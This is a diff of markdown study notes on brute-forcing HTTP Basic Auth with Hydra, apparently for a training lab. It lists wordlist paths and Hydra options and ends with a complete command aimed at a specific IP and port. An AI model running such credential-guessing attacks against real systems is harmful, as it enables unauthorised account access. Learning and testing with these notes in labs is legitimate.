@@ -8,17 +8,17 @@ To install Hydra use command `apt install hydra -y` or download from its Github 
 * password wordlists /opt/useful/SecLists/Passwords/
 * username wordlists /opt/useful/SecLists/Usernames/
 * https://github.com/danielmiessler/SecLists
-* 
+ 
 The most commonly used password wordlists is rockyou.txt, which has over 14 million unique passwords, sorted by how common they are. https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
 /opt/useful/SecLists/Passwords/Default-Credentials
  ftp-betterdefaultpasslist.txt
 
-Options	Description
--C ftp-betterdefaultpasslist.txt	Combined Credentials Wordlist
+### Hydra Options	Description
+```-C ftp-betterdefaultpasslist.txt	Combined Credentials Wordlist
 SERVER_IP	Target IP
 -s PORT	Target Port
 http-get	Request Method
-/	Target Path
+/	Target Path```
 
 ------Basic HTTP Auth Brute Forcing------
 hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 46.101.20.243 -s 32221 http-get /
